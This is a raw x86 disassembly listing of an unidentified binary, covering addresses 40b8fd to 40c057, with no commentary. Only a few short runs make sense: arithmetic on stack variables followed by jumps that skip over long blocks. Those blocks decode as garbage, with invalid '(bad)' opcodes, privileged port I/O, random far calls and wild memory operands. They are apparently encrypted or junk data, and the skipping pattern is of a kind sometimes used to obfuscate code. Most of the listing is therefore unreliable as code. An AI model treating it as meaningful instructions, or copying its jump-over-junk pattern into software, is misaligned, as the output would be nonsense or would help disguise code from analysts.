  40b8fd:	jge    0x40b8fb
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x45969905],cl
  40b949:	cmp    ch,BYTE PTR [edx+0x70708360]
  40b94f:	lahf   
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b9a6
  40b954:	fcom   QWORD PTR [ecx]
  40b956:	rcl    BYTE PTR [edx],1
  40b958:	sub    BYTE PTR [ecx-0x6ccf5301],0xa5
  40b95f:	dec    ebp
  40b960:	sbb    edx,esi
  40b962:	lods   eax,DWORD PTR ds:[esi]
  40b963:	mov    ch,0x57
  40b965:	push   ds
  40b966:	iret   
  40b967:	shl    DWORD PTR [edx+0x597aaaf9],0x22
  40b96e:	add    esp,DWORD PTR [edi-0x3e]
  40b971:	mov    al,ds:0xa91c4165
  40b976:	push   ebp
  40b977:	fnstenv [esi+0xc8b4f82]
  40b97d:	dec    esp
  40b97e:	add    BYTE PTR [esp+eiz*2+0x2482cadd],ch
  40b985:	dec    edx
  40b986:	xor    ebp,0xffacbb93
  40b98c:	lods   al,BYTE PTR ds:[esi]
  40b98d:	data16 cli 
  40b98f:	jl     0x40b927
  40b991:	dec    ecx
  40b992:	(bad)  
  40b993:	stc    
  40b994:	scas   eax,DWORD PTR es:[edi]
  40b995:	cmp    eax,DWORD PTR [eax]
  40b997:	dec    ebx
  40b998:	xchg   edi,eax
  40b999:	pop    esi
  40b99a:	or     BYTE PTR [edi+edx*4],dl
  40b99d:	imul   ecx,DWORD PTR [ecx],0xffffff8e
  40b9a0:	jb     0x40b9b3
  40b9a2:	fadd   st,st(6)
  40b9a4:	out    0xb9,al
  40b9a6:	sbb    eax,0x50eda81a
  40b9ab:	jnp    0x40b958
  40b9ad:	jle    0x40ba19
  40b9af:	xor    ecx,DWORD PTR [ecx+0x7f5444c6]
  40b9b5:	aaa    
  40b9b6:	fstp   DWORD PTR [edx]
  40b9b8:	aad    0x6a
  40b9ba:	jnp    0x40b9d8
  40b9bc:	prefetchw BYTE PTR [edx+ecx*4-0x437ab68e]
  40b9c4:	mov    al,0x19
  40b9c6:	xchg   BYTE PTR [esp+ebx*2+0x68a46846],bh
  40b9cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ce:	sbb    eax,0x3a30074f
  40b9d3:	pop    ds
  40b9d4:	cmp    DWORD PTR [edx],ebp
  40b9d6:	jbe    0x40b9bf
  40b9d8:	aas    
  40b9d9:	cmp    al,0xbc
  40b9db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9dc:	xlat   BYTE PTR ds:[ebx]
  40b9dd:	pusha  
  40b9de:	mov    ebx,0xec57a81
  40b9e3:	cmp    ah,BYTE PTR [edx-0x6d]
  40b9e6:	jbe    0x40ba43
  40b9e8:	(bad)  
  40b9e9:	push   ebp
  40b9ea:	xchg   edi,eax
  40b9eb:	adc    al,0xe7
  40b9ed:	and    al,0xa4
  40b9ef:	push   ebx
  40b9f0:	out    0xa8,eax
  40b9f2:	xor    esi,DWORD PTR [ebp-0x298e9e50]
  40b9f8:	push   esp
  40b9f9:	push   ebx
  40b9fa:	rol    BYTE PTR [eax],1
  40b9fc:	pop    edx
  40b9fd:	fs ss jge 0x40ba08
  40ba01:	pop    edi
  40ba02:	les    edx,FWORD PTR [edx]
  40ba04:	push   0x3e
  40ba06:	xlat   BYTE PTR ds:[ebx]
  40ba07:	cld    
  40ba08:	push   0xb26efeac
  40ba0d:	js     0x40b999
  40ba0f:	je     0x40b9b5
  40ba11:	enter  0x6dd3,0x81
  40ba15:	lods   al,BYTE PTR ds:[esi]
  40ba16:	ins    DWORD PTR es:[edi],dx
  40ba17:	je     0x40b9d1
  40ba19:	clc    
  40ba1a:	push   ss
  40ba1b:	in     eax,0x15
  40ba1d:	adc    ah,BYTE PTR [esi+ebp*2]
  40ba20:	mov    ds:0x994ff2ca,al
  40ba25:	out    dx,al
  40ba26:	aas    
  40ba27:	shl    DWORD PTR [ecx+0x61],cl
  40ba2a:	xchg   esp,eax
  40ba2b:	push   es
  40ba2c:	popa   
  40ba2d:	cli    
  40ba2e:	adc    dl,BYTE PTR [eax-0x5d9af7fa]
  40ba34:	ret    0x696b
  40ba37:	dec    ebx
  40ba38:	adc    eax,DWORD PTR [ebp+esi*1-0x3b]
  40ba3c:	push   ecx
  40ba3d:	sub    BYTE PTR [ebp-0x80],bl
  40ba40:	dec    eax
  40ba41:	pop    edi
  40ba42:	or     BYTE PTR [ebp-0x6cff736b],al
  40ba48:	call   0x372794e3
  40ba4d:	aam    0x8
  40ba4f:	stc    
  40ba50:	add    BYTE PTR [ebp+0x4c],dl
  40ba53:	inc    ebp
  40ba54:	rol    DWORD PTR [ebp+0x1f],1
  40ba57:	mov    ah,0xde
  40ba59:	out    0xa7,al
  40ba5b:	xor    DWORD PTR [edx],ecx
  40ba5d:	cmp    DWORD PTR [edi+0x6d037227],edi
  40ba63:	clc    
  40ba64:	adc    eax,0xbff17ef6
  40ba69:	mov    al,ds:0x54ad4389
  40ba6e:	mov    esi,0xfc34ea36
  40ba73:	(bad)
  40ba76:	in     al,0x24
  40ba78:	push   cs
  40ba79:	shr    DWORD PTR [ebp-0x57ef2cc1],0xe9
  40ba80:	jo     0x40ba3c
  40ba82:	call   FWORD PTR [ebp+0x7]
  40ba85:	clc    
  40ba86:	jae    0x40ba0d
  40ba88:	ja     0x40ba46
  40ba8a:	mov    edx,0x92f80ed9
  40ba8f:	jmp    0xc02c54cb
  40ba94:	sub    al,0x95
  40ba96:	scas   al,BYTE PTR es:[edi]
  40ba97:	call   0x8499:0x51ec5a6f
  40ba9e:	ins    DWORD PTR es:[edi],dx
  40ba9f:	sbb    BYTE PTR [esi],dl
  40baa1:	lock mov BYTE PTR [esi+0x76f4fc0a],ch
  40baa8:	(bad)  
  40baa9:	retf   
  40baaa:	sub    BYTE PTR [ebp-0x4af8c9df],dl
  40bab0:	stc    
  40bab1:	aam    0x9b
  40bab3:	xlat   BYTE PTR ds:[ebx]
  40bab4:	sbb    al,0x63
  40bab6:	inc    eax
  40bab7:	retf   
  40bab8:	or     dl,ch
  40baba:	dec    ebx
  40babb:	retf   
  40babc:	(bad)  
  40babd:	out    dx,eax
  40babe:	push   ebx
  40babf:	and    BYTE PTR [ebx+0x2a],dl
  40bac2:	in     al,dx
  40bac3:	sub    ch,ch
  40bac5:	cwde   
  40bac6:	mov    ch,0x62
  40bac8:	mov    dh,0x4e
  40baca:	pushf  
  40bacb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bacc:	or     eax,0x3b431ac1
  40bad1:	sbb    al,0xe8
  40bad3:	enter  0x5b65,0xc3
  40bad7:	lea    ecx,[esi+0x422a39d9]
  40badd:	push   es
  40bade:	xchg   ebp,eax
  40badf:	hlt    
  40bae0:	add    eax,0x24e616a2
  40bae5:	and    al,BYTE PTR [edx+ebp*1]
  40bae8:	out    dx,eax
  40bae9:	lahf   
  40baea:	cmp    cx,di
  40baed:	xor    eax,0x636b49d3
  40baf2:	lea    eax,[esi]
  40baf4:	ret    0xaa73
  40baf7:	fbstp  TBYTE PTR [ebx+0x7ff8e526]
  40bafd:	jno    0x40bb14
  40baff:	into   
  40bb00:	lds    ebp,FWORD PTR [edx-0x32ec454]
  40bb06:	pop    ebp
  40bb07:	pusha  
  40bb08:	xchg   ecx,eax
  40bb09:	lods   al,BYTE PTR ds:[esi]
  40bb0a:	mov    esi,0x2da78a4e
  40bb0f:	sub    cl,BYTE PTR [edx-0x28cb724a]
  40bb15:	jmp    0xcb0b:0x46b6de8
  40bb1c:	rcl    BYTE PTR [ebp+0x7f],0x8
  40bb20:	adc    DWORD PTR [eax+0x4a8e7696],ebp
  40bb26:	aaa    
  40bb27:	mov    eax,ds:0x345969f0
  40bb2c:	js     0x40bacb
  40bb2e:	repz adc cl,cl
  40bb31:	call   0xfac9:0x858bfb40
  40bb38:	ret    0x33a7
  40bb3b:	inc    eax
  40bb3c:	add    BYTE PTR [ecx],cl
  40bb3e:	iret   
  40bb3f:	dec    eax
  40bb40:	cmp    al,0xdf
  40bb42:	add    ebx,esi
  40bb44:	lds    eax,FWORD PTR [ecx+0x996750c]
  40bb4a:	inc    esi
  40bb4b:	xchg   ebx,eax
  40bb4c:	jge    0x40baf4
  40bb4e:	pushf  
  40bb4f:	pusha  
  40bb50:	mov    ds:0x17279160,al
  40bb55:	cli    
  40bb56:	mov    ebx,0xbd4726f1
  40bb5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb5c:	and    edx,ebp
  40bb5e:	sub    eax,0x5d123141
  40bb63:	xchg   ecx,eax
  40bb64:	mov    edx,0xb53ae772
  40bb69:	xor    dl,ah
  40bb6b:	xor    ebx,DWORD PTR [ebx]
  40bb6d:	sbb    al,0xfb
  40bb6f:	stos   DWORD PTR es:[edi],eax
  40bb70:	jp     0x40bb59
  40bb72:	lea    edx,[esi]
  40bb74:	dec    edi
  40bb75:	test   BYTE PTR [edi],al
  40bb77:	sub    al,0x8
  40bb79:	and    DWORD PTR [bx+si-0x6694],eax
  40bb7e:	fcomp  DWORD PTR [eax]
  40bb80:	test   al,0xe7
  40bb82:	adc    al,0xfa
  40bb84:	outs   dx,DWORD PTR ds:[esi]
  40bb85:	mov    esp,DWORD PTR [edx]
  40bb87:	adc    eax,DWORD PTR [ecx-0x6355d86f]
  40bb8d:	fs or  eax,0xfb27b53e
  40bb93:	add    BYTE PTR [eax],dh
  40bb95:	std    
  40bb96:	loope  0x40bb6c
  40bb98:	vpshad ymm13,[ecx+0x70],xmm1
  40bb9e:	js     0x40bbf1
  40bba0:	push   eax
  40bba1:	xchg   edi,eax
  40bba2:	mov    ?,WORD PTR [ebx+0xae6b89d]
  40bba8:	push   ebp
  40bba9:	or     eax,0x1e57a900
  40bbae:	mov    esi,0x32fe7602
  40bbb3:	jne    0x40bc1f
  40bbb5:	mov    bh,0x44
  40bbb7:	mov    al,BYTE PTR [edi-0xd]
  40bbba:	push   ss
  40bbbb:	lahf   
  40bbbc:	xchg   ebx,eax
  40bbbd:	ja     0x40bb86
  40bbbf:	sbb    BYTE PTR [edi-0x5b],bh
  40bbc2:	ins    DWORD PTR es:[edi],dx
  40bbc3:	das    
  40bbc4:	xchg   ebp,eax
  40bbc5:	mov    gs,edi
  40bbc7:	test   DWORD PTR [ecx],0x7f5fe45a
  40bbcd:	add    dh,BYTE PTR [esp+eiz*8+0x7e153e68]
  40bbd4:	neg    al
  40bbd6:	cs jb  0x40bc38
  40bbd9:	xlat   BYTE PTR ds:[ebx]
  40bbda:	in     eax,dx
  40bbdb:	xchg   ecx,eax
  40bbdc:	in     al,dx
  40bbdd:	es into 
  40bbdf:	mov    ecx,0xae4149bb
  40bbe4:	jae    0x40bbf1
  40bbe6:	xchg   DWORD PTR [ecx-0x6b],esi
  40bbe9:	sbb    DWORD PTR [edx+0x7788bac8],ebp
  40bbef:	sar    DWORD PTR [eax+esi*2],cl
  40bbf2:	pop    ss
  40bbf3:	sub    bh,BYTE PTR [esi]
  40bbf5:	lahf   
  40bbf6:	popa   
  40bbf7:	repnz mov cl,0x71
  40bbfa:	jg     0x40bc3b
  40bbfc:	daa    
  40bbfd:	sbb    edi,DWORD PTR [ebp+0x73]
  40bc00:	inc    esi
  40bc01:	mov    DWORD PTR [esi],ebp
  40bc03:	jl     0x40bbf3
  40bc05:	pop    eax
  40bc06:	inc    esi
  40bc07:	push   ebx
  40bc08:	fmul   DWORD PTR [edi+0x10]
  40bc0b:	loop   0x40bc02
  40bc0d:	inc    edi
  40bc0e:	repz cdq 
  40bc10:	push   es
  40bc11:	jne    0x40bc35
  40bc13:	mov    ch,0x1b
  40bc15:	and    al,0x33
  40bc17:	cs pop edi
  40bc19:	clc    
  40bc1a:	in     al,dx
  40bc1b:	fmul   QWORD PTR [edx-0x2641216e]
  40bc21:	in     al,dx
  40bc22:	sbb    BYTE PTR [esi],al
  40bc24:	cwde   
  40bc25:	cli    
  40bc26:	ds xor al,0x73
  40bc29:	lock cmp ecx,ebx
  40bc2c:	push   DWORD PTR [ecx+ebp*1+0x1d]
  40bc30:	loop   0x40bc05
  40bc32:	mov    ch,0x4d
  40bc34:	jge    0x40bc14
  40bc36:	popf   
  40bc37:	test   al,0x4c
  40bc39:	sbb    DWORD PTR [edi-0x32454680],ecx
  40bc3f:	cmp    dh,BYTE PTR [ebp-0x60]
  40bc42:	stc    
  40bc43:	shl    ah,cl
  40bc45:	dec    ebx
  40bc46:	std    
  40bc47:	cmp    BYTE PTR [eax+eiz*1-0x64da8d91],cl
  40bc4e:	dec    ecx
  40bc4f:	mov    ecx,0x8f41ad1d
  40bc54:	jecxz  0x40bcb4
  40bc56:	out    dx,eax
  40bc57:	(bad)  
  40bc58:	jg     0x40bc5b
  40bc5a:	add    bh,BYTE PTR [ebx-0x5b952b1f]
  40bc60:	pop    es
  40bc61:	mov    edx,0x5b7c4c8
  40bc66:	pop    ebp
  40bc67:	daa    
  40bc68:	lahf   
  40bc69:	popa   
  40bc6a:	mov    dl,0x3b
  40bc6c:	jns    0x40bcc5
  40bc6e:	call   0x7f89:0xcd7e0479
  40bc75:	js     0x40bccc
  40bc77:	int    0xaf
  40bc79:	data16 repnz outs dx,BYTE PTR ds:[esi]
  40bc7c:	aas    
  40bc7d:	add    BYTE PTR [ebx-0x33],al
  40bc80:	sub    esi,eax
  40bc82:	lock mov ecx,0x180b5b2f
  40bc88:	mov    ecx,0x87f060de
  40bc8d:	mov    ds:0x1e374555,eax
  40bc92:	pop    eax
  40bc93:	or     al,0x39
  40bc95:	cmp    DWORD PTR [ecx-0x59],edx
  40bc98:	mov    al,ds:0x8170404c
  40bc9d:	lods   al,BYTE PTR ds:[esi]
  40bc9e:	ins    DWORD PTR es:[edi],dx
  40bc9f:	fild   DWORD PTR [esi+0x63]
  40bca2:	jne    0x40bc97
  40bca4:	xchg   edi,eax
  40bca5:	push   ss
  40bca6:	add    eax,0x6794339d
  40bcab:	gs mov edx,0x7ddaf7ce
  40bcb1:	push   DWORD PTR [edx+0x6a]
  40bcb4:	ja     0x40bca6
  40bcb6:	pop    esp
  40bcb7:	imul   edx,esi,0x21bee02a
  40bcbd:	and    DWORD PTR [ebx],edx
  40bcbf:	test   DWORD PTR [ebx+ebp*2-0x484fb1cd],esp
  40bcc6:	rcl    ebp,1
  40bcc8:	or     bh,BYTE PTR [esi]
  40bcca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bccb:	out    dx,al
  40bccc:	mov    esp,DWORD PTR [ebp+0x7]
  40bccf:	xchg   esp,eax
  40bcd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcd1:	outs   dx,BYTE PTR ds:[esi]
  40bcd2:	mov    al,ds:0x975d3a55
  40bcd7:	and    DWORD PTR [ebx+0x59e5ba4f],esi
  40bcdd:	stos   DWORD PTR es:[edi],eax
  40bcde:	xchg   ebx,eax
  40bcdf:	and    BYTE PTR [edi-0x3ad7dea2],dl
  40bce5:	mov    WORD PTR [esi-0x6d],es
  40bce8:	scas   eax,DWORD PTR es:[edi]
  40bce9:	das    
  40bcea:	test   eax,0x55ce3fe5
  40bcef:	cdq    
  40bcf0:	cmc    
  40bcf1:	push   ecx
  40bcf2:	(bad)  
  40bcf3:	fisttp DWORD PTR [ebx-0x20d40fa3]
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    bh,BYTE PTR [ecx-0x4a]
  40bd40:	mov    ebx,0x708f8fc1
  40bd45:	jo     0x40bce6
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bdc6
  40bd4b:	mov    ebp,0x5b032ca4
  40bd50:	push   ecx
  40bd51:	(bad)  [esi]
  40bd53:	sar    DWORD PTR [ebp+0x5a10c6e8],0xc6
  40bd5a:	pop    esp
  40bd5b:	loopne 0x40bdb7
  40bd5d:	pop    ecx
  40bd5e:	fisttp DWORD PTR [ebx*2-0x1fd87851]
  40bd65:	(bad)  es:[eax+0x6da30f42]
  40bd6c:	imul   edi,DWORD PTR cs:[ecx],0x2e66666b
  40bd73:	out    dx,eax
  40bd74:	inc    ebp
  40bd75:	(bad)  
  40bd76:	jmp    0x8f5d:0x7146fcf3
  40bd7d:	push   esi
  40bd7e:	inc    ecx
  40bd7f:	xchg   ecx,eax
  40bd80:	les    esp,FWORD PTR [ecx+0x16]
  40bd83:	ss pop es
  40bd85:	add    eax,DWORD PTR [ecx+0x6]
  40bd88:	repnz (bad) 
  40bd8a:	nop
  40bd8b:	cli    
  40bd8c:	pop    edi
  40bd8d:	add    ebp,DWORD PTR [eax]
  40bd8f:	icebp  
  40bd90:	inc    esi
  40bd91:	sub    esi,DWORD PTR [ebp-0x73]
  40bd94:	(bad)  [edi+edi*1]
  40bd97:	ficom  DWORD PTR [edi]
  40bd99:	daa    
  40bd9a:	sub    al,0x37
  40bd9c:	fisttp WORD PTR [ebx]
  40bd9e:	pop    ebx
  40bd9f:	bound  esi,QWORD PTR [edx]
  40bda1:	ss jno 0x40bdb0
  40bda4:	fsub   st,st(0)
  40bda6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bda7:	jno    0x40be25
  40bda9:	sbb    eax,0x908381c0
  40bdae:	adc    eax,0x5f50e44c
  40bdb3:	add    DWORD PTR ds:0xa0b70c78,ebp
  40bdb9:	ds mov ah,0x2e
  40bdbc:	shl    DWORD PTR [ecx+0x5d],0x6a
  40bdc0:	outs   dx,DWORD PTR ds:[esi]
  40bdc1:	test   al,0x22
  40bdc3:	mov    bl,0xe6
  40bdc5:	ror    DWORD PTR [di],cl
  40bdc8:	(bad)
  40bdcc:	xchg   ebp,eax
  40bdcd:	mov    dl,0xed
  40bdcf:	and    eax,0xb27bea4
  40bdd4:	sbb    BYTE PTR [ebx],bh
  40bdd6:	xor    al,0xd1
  40bdd8:	or     esi,esi
  40bdda:	scas   al,BYTE PTR es:[edi]
  40bddb:	inc    eax
  40bddc:	add    edx,esp
  40bdde:	(bad)  
  40bddf:	jp     0x40be4d
  40bde1:	sub    esi,edx
  40bde3:	mov    bh,0xf
  40bde5:	pop    edx
  40bde6:	pop    ebx
  40bde7:	jb     0x40be55
  40bde9:	sub    esp,DWORD PTR [ecx-0x40]
  40bdec:	sti    
  40bded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdee:	dec    ecx
  40bdef:	add    eax,0xb93f3de9
  40bdf4:	int    0xdf
  40bdf6:	push   0xe4e5c128
  40bdfb:	data16 jb 0x40be04
  40bdfe:	jmp    0xfe9:0xf0134bfa
  40be05:	xchg   edi,eax
  40be06:	jl     0x40be10
  40be08:	adc    eax,0xe56bcfdf
  40be0d:	sbb    dl,BYTE PTR [esi-0x6d4df79e]
  40be13:	or     BYTE PTR [ebp+edi*1-0x2562cca9],cl
  40be1a:	sub    bl,BYTE PTR [esi+0x4dd9d889]
  40be20:	repnz dec ebx
  40be22:	cwde   
  40be23:	call   0x27448c72
  40be28:	aad    0x31
  40be2a:	mov    esp,0x616d0a60
  40be2f:	in     eax,dx
  40be30:	adc    cl,dh
  40be32:	fld    DWORD PTR [eax]
  40be34:	xchg   edx,eax
  40be35:	sub    ecx,edx
  40be37:	je     0x40be99
  40be39:	add    dh,ah
  40be3b:	not    DWORD PTR [eax]
  40be3d:	pop    ds
  40be3e:	bound  edx,QWORD PTR [ebx-0x6b]
  40be41:	or     al,0xb
  40be43:	test   BYTE PTR [ebp-0x4a6cf8b8],ch
  40be49:	cs push ds
  40be4b:	cmp    BYTE PTR ds:0x5598591d,0xb1
  40be52:	sbb    bl,BYTE PTR [esi-0x42]
  40be55:	adc    al,BYTE PTR [eax+0x4a]
  40be58:	test   DWORD PTR [esi],0x335df2a8
  40be5e:	cmp    edi,DWORD PTR [eax+ebx*2-0x1660764]
  40be65:	dec    edi
  40be66:	in     eax,0xd2
  40be68:	(bad)  
  40be69:	dec    ecx
  40be6a:	jg     0x40be58
  40be6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be6d:	push   ss
  40be6e:	pop    eax
  40be6f:	sub    ch,BYTE PTR [edx]
  40be71:	scas   eax,DWORD PTR es:[edi]
  40be72:	push   eax
  40be73:	cmp    eax,0x81942a7
  40be78:	call   0xdb27:0x6c26c393
  40be7f:	fsubr  QWORD PTR [ebx+0x673d7c4c]
  40be85:	out    dx,eax
  40be86:	jno    0x40be6d
  40be88:	pop    ss
  40be89:	dec    DWORD PTR [edi]
  40be8b:	dec    eax
  40be8c:	(bad)  
  40be8d:	loope  0x40be50
  40be8f:	and    al,0xfd
  40be91:	push   ebx
  40be92:	gs in  al,0xec
  40be95:	xchg   ebx,eax
  40be96:	cmp    ecx,esi
  40be98:	pop    ss
  40be99:	lods   eax,DWORD PTR ds:[esi]
  40be9a:	ds or  bh,ch
  40be9d:	mov    al,ds:0x4abfe092
  40bea2:	jge    0x40bf1f
  40bea4:	and    al,0x3b
  40bea6:	push   ss
  40bea7:	(bad)  
  40bea8:	pusha  
  40bea9:	push   ebx
  40beaa:	xor    ch,BYTE PTR [esi]
  40beac:	sbb    BYTE PTR [ebx],bh
  40beae:	mov    al,ds:0x478a834b
  40beb3:	(bad)  
  40beb4:	jnp    0x40bf29
  40beb6:	jns    0x40bf07
  40beb8:	stc    
  40beb9:	popf   
  40beba:	fpatan 
  40bebc:	in     eax,dx
  40bebd:	mov    ch,0x49
  40bebf:	rol    DWORD PTR [edx],cl
  40bec1:	jmp    DWORD PTR [eax]
  40bec3:	mov    ah,0x0
  40bec5:	nop
  40bec6:	push   esp
  40bec7:	sub    cl,0x5d
  40beca:	and    dh,BYTE PTR [ecx-0x599f9d44]
  40bed0:	push   cs
  40bed1:	sahf   
  40bed2:	adc    bl,BYTE PTR [edi-0x437cf10c]
  40bed8:	(bad)  
  40beda:	(bad)  
  40bedc:	(bad)  
  40bedd:	push   esp
  40bede:	or     eax,0xda64f53a
  40bee3:	(bad)  
  40bee4:	jb     0x40bf05
  40bee6:	push   si
  40bee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bee9:	xor    eax,0xf3866222
  40beee:	xchg   BYTE PTR [edi],dh
  40bef0:	sbb    eax,0x8f44462e
  40bef5:	je     0x40bf14
  40bef7:	jmp    0xa60d2ba1
  40befc:	mov    fs:0x3d705fa8,al
  40bf02:	hlt    
  40bf03:	(bad)  
  40bf04:	sub    eax,0xab8f13cc
  40bf09:	ret    
  40bf0a:	push   0x37
  40bf0c:	retf   0x23d8
  40bf0f:	sub    DWORD PTR [esi],ecx
  40bf11:	test   DWORD PTR [ecx+0x2d9cbb0a],0x1b8168c1
  40bf1b:	repz xor al,0xd8
  40bf1e:	je     0x40bf30
  40bf20:	dec    edx
  40bf21:	mov    edi,0xf30bdeb8
  40bf26:	bsr    edi,DWORD PTR [ebx-0xd]
  40bf2a:	dec    edx
  40bf2b:	xchg   ebp,eax
  40bf2c:	sub    eax,0xeb9b75f5
  40bf31:	outs   dx,DWORD PTR ds:[esi]
  40bf32:	popf   
  40bf33:	push   ebp
  40bf34:	or     al,0x63
  40bf36:	aam    0x66
  40bf38:	inc    ebx
  40bf39:	pop    ebp
  40bf3a:	rol    DWORD PTR [ebx+0x212622c8],1
  40bf40:	fdivr  QWORD PTR [ecx]
  40bf42:	push   0xed0cba3a
  40bf47:	cmp    DWORD PTR [ecx-0x6a],ebp
  40bf4a:	inc    eax
  40bf4b:	add    BYTE PTR [edi],cl
  40bf4d:	adc    DWORD PTR [ebp-0x1ed06c9a],ecx
  40bf53:	jo     0x40bf0d
  40bf55:	push   edx
  40bf56:	push   cs
  40bf57:	push   ebp
  40bf58:	inc    ecx
  40bf59:	push   es
  40bf5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf5b:	lea    esi,ds:0xf1ac70b3
  40bf61:	add    ch,BYTE PTR [edi+0xc]
  40bf64:	jge    0x40bf71
  40bf66:	cmp    BYTE PTR [ecx-0x509b3150],dl
  40bf6c:	mul    BYTE PTR [ebx+0x4f]
  40bf6f:	adc    al,0xf5
  40bf71:	test   al,0xc
  40bf73:	mov    cl,BYTE PTR [edx-0x21]
  40bf76:	jp     0x40bf61
  40bf78:	xchg   BYTE PTR [ebp-0x5a],cl
  40bf7b:	mov    WORD PTR [esi+eiz*1+0x41],ss
  40bf7f:	aaa    
  40bf80:	imul   ebx,DWORD PTR [eax+0x58],0x26f4db54
  40bf87:	je     0x40c007
  40bf89:	(bad)  
  40bf8a:	(bad)  
  40bf8b:	cli    
  40bf8c:	mov    eax,DWORD PTR [edi-0x3a231a4c]
  40bf92:	mov    BYTE PTR [ebx+0x3a],dh
  40bf95:	push   ds
  40bf96:	popa   
  40bf97:	repz adc ebp,DWORD PTR [ecx]
  40bf9a:	lods   eax,DWORD PTR ds:[esi]
  40bf9b:	call   0x1660:0x1902f63d
  40bfa2:	dec    edi
  40bfa3:	mov    edx,0x1b849ec0
  40bfa8:	dec    eax
  40bfa9:	jne    0x3d1aa97f
  40bfaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfb0:	jne    0x40bf62
  40bfb2:	ror    DWORD PTR ds:0x4e762d8f,cl
  40bfb8:	push   edi
  40bfb9:	lea    esp,[ecx+0x7f894af7]
  40bfbf:	out    dx,al
  40bfc0:	pop    es
  40bfc1:	adc    ecx,ebp
  40bfc3:	mov    DWORD PTR [ebp+0x47],ebx
  40bfc6:	lock adc al,0x2
  40bfc9:	push   ds
  40bfca:	pop    ss
  40bfcb:	or     eax,0xa75d04b0
  40bfd0:	mov    edx,0x4d116044
  40bfd5:	push   esp
  40bfd6:	ret    
  40bfd7:	out    0xb5,eax
  40bfd9:	les    ebx,FWORD PTR [edi-0x4c228b20]
  40bfdf:	xor    eax,DWORD PTR [ebx+edi*8]
  40bfe2:	das    
  40bfe3:	and    ah,BYTE PTR [edx]
  40bfe5:	lods   al,BYTE PTR ds:[esi]
  40bfe6:	(bad)  
  40bfe7:	ins    BYTE PTR es:[edi],dx
  40bfe8:	into   
  40bfe9:	dec    edx
  40bfea:	test   eax,0xf4222b90
  40bfef:	sub    al,BYTE PTR [edx+0x32]
  40bff2:	lahf   
  40bff3:	dec    esp
  40bff4:	pop    esi
  40bff5:	int3   
  40bff6:	dec    esi
  40bff7:	jl     0x40c003
  40bff9:	jb     0x40c048
  40bffb:	(bad)  
  40bffd:	jmp    0xa714:0xe5121e3d
  40c004:	cld    
  40c005:	pop    es
  40c006:	call   FWORD PTR [ecx-0x4fb1da5d]
  40c00c:	fsubr  st(0),st
  40c00e:	ja     0x40c00d
  40c010:	push   edi
  40c011:	and    bh,BYTE PTR [esi]
  40c013:	jno    0x40bfb9
  40c015:	lock adc eax,0x2d0d14e7
  40c01b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c01c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c01d:	pop    ecx
  40c01e:	mov    ch,0xdc
  40c020:	xchg   BYTE PTR [edi-0x25],dh
  40c023:	clc    
  40c024:	in     eax,0x3b
  40c026:	add    BYTE PTR [edx+ebp*4-0x42],bl
  40c02a:	xchg   ebx,eax
  40c02b:	mov    cx,0xa1a6
  40c02f:	popf   
  40c030:	addr16 xor edi,ecx
  40c033:	loop   0x40c0a1
  40c035:	mov    bl,0xa4
  40c037:	rcr    DWORD PTR [ecx+ecx*2-0x572f8901],0x1
  40c03f:	stos   BYTE PTR es:[edi],al
  40c040:	push   esi
  40c041:	mov    es,ecx
  40c043:	loope  0x40c04f
  40c045:	sub    BYTE PTR ds:0x7d9994f1,cl
  40c04b:	xor    edx,DWORD PTR [esi-0x49ca39a2]
  40c051:	test   eax,0xdb4f4169
  40c056:	iret   
  40c057:	cmp    al,0xba
